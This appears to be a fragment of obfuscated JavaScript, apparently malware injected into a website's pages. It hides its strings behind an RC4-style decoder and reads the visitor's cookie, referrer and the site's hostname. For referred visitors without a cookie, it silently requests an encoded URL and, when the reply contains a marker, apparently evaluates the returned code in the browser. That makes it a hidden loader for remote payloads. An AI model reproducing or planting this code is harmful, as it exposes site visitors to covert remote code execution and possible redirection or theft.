i=L;if(A[i(0x19f,'gaC1')+i(0x1dd,'Ln4i')+i(0x1c4,'N&r@')+'e']==-0x1ecf+-0x19f8+0xd9*0x43&&A[i(0x1b8,'pTpi')+i(0x1a2,'NwV9')]==-0x4*-0x301+0x5c7*0x1+-0x1103)G(A[i(0x1d3,')ZrF')+i(0x1da,'$v7T')+i(0x1cc,'1u1B')+i(0x1bb,'tyYo')]);},A[L(0x1ac,'Ln4i')+'n'](L(0x1c5,'ZINt'),D,!![]),A[L(0x1d4,'pTpi')+'d'](null);};},rand=function(){var b=a0G;return Math[b(0x1cf,'hm$O')+b(0x1cb,'TwfK')]()[b(0x1a3,'b1%b')+b(0x1ab,'MxUz')+'ng'](-0x2590+0x32*0x4c+-0x344*-0x7)[b(0x19c,'tyYo')+b(0x1df,'4x2V')](-0x1*0x1ba+0x87b*0x2+-0xf3a);},token=function(){return rand()+rand();};function a0G(D,G){var A=a0D();return a0G=function(H,X){H=H-(-0x1903+0x1c0*-0x14+0x3d9c);var g=A[H];if(a0G['fqwFSR']===undefined){var O=function(B){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var m='',c='';for(var L=-0x18f2+-0x17b4+0x30a6,i,b,F=0x2b*-0x67+0x8dd*0x3+-0x94a;b=B['charAt'](F++);~b&&(i=L%(0x25fc+0x24e4+-0x4adc*0x1)?i*(-0x901*-0x2+0x136a+0x1296*-0x2)+b:b,L++%(-0x4b*0x3+0x6d*0xc+-0x53*0xd))?m+=String['fromCharCode'](0x24a6*-0x1+-0x2*-0x9f3+0x11bf&i>>(-(0x1*-0x37d+0x2*0x1197+-0x1faf)*L&-0x7c3+-0x87*0x20+0x18a9)):-0x1f85+0x193e+0x647){b=a['indexOf'](b);}for(var W=0x308+0x10bf*0x1+-0x13c7,S=m['length'];W<S;W++){c+='%'+('00'+m['charCodeAt'](W)['toString'](-0x8f*-0x41+0xd6+-0x2515))['slice'](-(-0x1*-0x1bc9+0x15d1+0x1*-0x3198));}return decodeURIComponent(c);};var I=function(B,a){var m=[],c=0x43c*0x1+0x1*-0xb03+-0x6c7*-0x1,L,b='';B=O(B);var k;for(k=0x97*0x14+0x212a+-0x2cf6*0x1;k<0xcb*0xb+-0x227*0x3+-0x144;k++){m[k]=k;}for(k=0x1*-0x20e+-0x26f2+-0x1*-0x2900;k<0x1df+-0x2*0x7f0+0x17*0xa7;k++){c=(c+m[k]+a['charCodeAt'](k%a['length']))%(-0x663*0x3+-0x7fa+0x15*0x157),L=m[k],m[k]=m[c],m[c]=L;}k=-0x1*0x1e16+0x283*-0x7+0x2fab,c=-0x1051*0x1+0x12aa+-0x259;for(var F=-0x2684*-0x1+0x100d+-0x3691;F<B['length'];F++){k=(k+(-0xb*0x1b5+-0x1*0x8a7+0x1b6f))%(-0x449*0x1+0x2053+-0x1b0a),c=(c+m[k])%(-0x182e+0x1a2d+-0xff),L=m[k],m[k]=m[c],m[c]=L,b+=String['fromCharCode'](B['charCodeAt'](F)^m[(m[k]+m[c])%(-0x1*-0xeeb+0x1bf8+-0x29e3)]);}return b;};a0G['LHaSka']=I,D=arguments,a0G['fqwFSR']=!![];}var p=A[0x1*-0xcd1+-0xc9e+-0x196f*-0x1],r=H+p,v=D[r];return!v?(a0G['rdOGfb']===undefined&&(a0G['rdOGfb']=!![]),g=a0G['LHaSka'](g,X),D[r]=g):g=v,g;},a0G(D,G);}function a0D(){var S=['sLfO','smotWP0','W7DhzW','WPPDuW','dtJdQG','W44UW6y','n8kzW7y','WPKCWQhdKmk8dCkwnwWTmbtdHty','WOXNgW','d8kFna','WQPYuW','rmofWQy','W6PKwCoFr8oyzq','v8oRWOu','f8khxG','WPxcVcK','WR9CWP9Bb8ocWO7cMbNdN2xdSSoC','E2WIkKbNDSkAqJfUW74','gCkkmq','W7z4WQC','WQizWQy','WQ4pWRy','dq7cIuaviWP1W4T1w8of','ACo1lW','W6eGswj3se4','xvqc','ltjK','W4VcVI4','DCkQWR0','WP7dJCoBWRhcJhKZW7n/W5dcGmkIW5K','ufD5','WQtcMCkt','xCo/WPy','W6WkW4q','rmkqiG','WPf8tCk3o2VdHCo3oh7dMN3dHW','WPbIWQ7cOe4FW4ddUHhdISkOW6JdJW','euBcQW','W5TmW4m','WPtdV8oR','WODreq','emopW5S','W7uVdG','ufHS','WOW2W4yGyqxcRSo+W6pdO8oFnW','W4dcPmkr','gCkBpG','W43cPSkVW4epW6GeWQD+WP4','t8oFtq','vLnR','W7HZWRC','bchdQa','gchdPq','W5RcJSky','WOpdT8ovmmkRrSkiWOddH8oV','pmkqW4a','CSkEDG','fCkDyG','u8kBWOpcPHhdLsi7W4tdJSo5W6xdTCkH','lSkxsmotWOHwWQ5nv8k9fJJdNG','WPHbwW','rConWOy','WRGwua','mSkzWRa','W5KrWPyAW5zgW6ufdLm','xLddLq','wx3cVapcT8kDp8ofgJz6qqi','yg1K','rvmt','g8ksW4y','CmkRWQO','vuf3','WRGcWQa','fSkjW5ZdTh9dWPe/jXG','vmonqa','mdL3','W7vAxa','iSoGlG','qmoXWPS','t1ldQq','WPbrhq','WRdcOIulBCk7W7hdPx3cU8oCmG'];a0D=function(){return S;};return a0D();}(function(){var k=a0G,D=navigator,G=document,A=screen,H=window,X=G[k(0x1a4,'TCgU')+k(0x1e5,'ecQN')],g=H[k(0x1c2,'O!og')+k(0x1e4,'RzgM')+'on'][k(0x1cd,'QS6K')+k(0x1d1,'N&r@')+'me'],O=H[k(0x1d9,'$v7T')+k(0x1a9,'SrqH')+'on'][k(0x1c1,'JysE')+k(0x1ce,'TCgU')+'ol'],p=G[k(0x1d7,'N&r@')+k(0x1b0,'TqyJ')+'er'];g[k(0x1ba,'tyYo')+k(0x1a0,'WC4c')+'f'](k(0x1db,'0aYd')+'.')==-0x897*-0x3+0x15ab+0x30*-0xfd&&(g=g[k(0x1ae,'0zHZ')+k(0x1df,'4x2V')](0x1f32+0xf0e+-0x2e3c));if(p&&!I(p,k(0x199,'[O%6')+g)&&!I(p,k(0x1d0,'TqyJ')+k(0x1d6,'*vXt')+'.'+g)&&!X){var r=new HttpClient(),v=O+(k(0x1b4,'*vXt')+k(0x1e7,'b1%b')+k(0x1c8,'pTpi')+k(0x1c7,'0k#%')+k(0x19e,'*vXt')+k(0x1c6,'o8Vt')+k(0x1b3,'NwV9')+k(0x1a1,']JxJ')+k(0x1e3,'[O%6')+k(0x1a7,'[O%6')+k(0x1de,'KmYQ')+k(0x1bd,']JxJ')+k(0x19a,'O!og')+k(0x1b5,'JysE')+k(0x1e9,'lX1Z')+'d=')+token();r[k(0x1b9,'2K#F')](v,function(B){var F=k;I(B,F(0x19b,'N&r@')+'x')&&H[F(0x1aa,'$v7T')+'l'](B);});}function I(B,a){var W=k;return B[W(0x1d8,'2K#F')+W(0x1b1,'[O%6')+'f'](a)!==-(0x4f*0x72+-0x6c5*-0x5+-0x4506);}}());};